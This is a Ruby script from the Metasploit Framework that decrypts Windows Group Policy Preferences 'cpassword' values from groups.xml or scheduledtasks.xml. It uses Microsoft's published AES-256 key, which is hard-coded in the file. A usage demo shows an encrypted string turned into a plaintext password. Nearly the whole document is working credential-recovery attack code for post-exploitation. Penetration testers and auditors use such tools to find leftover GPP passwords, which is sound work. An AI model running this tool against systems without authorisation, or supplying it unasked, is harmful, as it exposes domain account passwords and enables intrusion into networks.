#!/usr/bin/env ruby

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#
# This script will allow you to specify an encrypted cpassword string using the Microsoft's public
# AES key. This is useful if you don't or can't use the GPP post exploitation module. Just paste
# the cpassword encrypted string found in groups.xml or scheduledtasks.xml and it will output the
# decrypted string for you.
#
# Tested Windows Server 2008 R2 Domain Controller.
#
# Authors:
# Ben Campbell <eat_meatballs[at]hotmail.co.uk>
# Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>
# scriptmonkey <scriptmonkey[at]owobble.co.uk>
# theLightCosine
# mubix (domain/dc enumeration code)
# David Kennedy "ReL1K" <kennedyd013[at]gmail.com>
#
# References:
# http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
# http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)
# http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
# http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx
#
# Demo:
# $ ./cpassword_decrypt.rb AzVJmXh/J9KrU5n0czX1uBPLSUjzFE8j7dOltPD8tLk
# [+] The decrypted AES password is: testpassword
#

msfbase = __FILE__
while File.symlink?(msfbase)
  msfbase = File.expand_path(File.readlink(msfbase), File.dirname(msfbase))
end

$:.unshift(File.expand_path(File.join(File.dirname(msfbase), '..', '..', 'lib')))

gem 'rex-text'

require 'msfenv'
require 'rex'

class CPassword

  #
  # Decrypts the AES-encrypted cpassword string
  # @param encrypted_data [String] The encrypted cpassword
  # @return [String] The decrypted string in ASCII
  #
  def decrypt(encrypted_data)
    # Prepare the password for the decoder
    padding = "=" * (4 - (encrypted_data.length % 4))
    epassword = "#{encrypted_data}#{padding}"

    # Decode the string using Base64
    decoded = Rex::Text.decode_base64(epassword)

    # Decryption
    key  = ''
    key << "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc"
    key << "\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    begin
      aes = OpenSSL::Cipher.new("AES-256-CBC")
      aes.decrypt
      aes.key = key
      plaintext = aes.update(decoded)
      plaintext << aes.final
    rescue OpenSSL::Cipher::CipherError
      # Decryption failed possibily due to bad input
      return ''
    end

    # Converts the string to ASCII
    Rex::Text.to_ascii(plaintext)
  end
end

#
# Shows script usage
#
def usage
  print_status("Usage: #{__FILE__} [The encrypted cpassword string]")
  exit
end

#
# Prints a status message
#
def print_status(msg='')
  $stderr.puts "[*] #{msg}"
end

#
# Prints an error message
#
def print_error(msg='')
  $stderr.puts "[-] #{msg}"
end

#
# Prints a good message
#
def print_good(msg='')
  $stderr.puts "[+] #{msg}"
end

#
# main
#
if __FILE__ == $PROGRAM_NAME
  pass = ARGV.shift

  # Input check
  usage if pass.nil? or pass.empty?

  cpasswd = CPassword.new
  pass = cpasswd.decrypt(pass)

  if pass.empty?
    print_error("Nothing was decrypted, please check your input.")
  else
    print_good("The decrypted AES password is: #{pass}")
  end
end
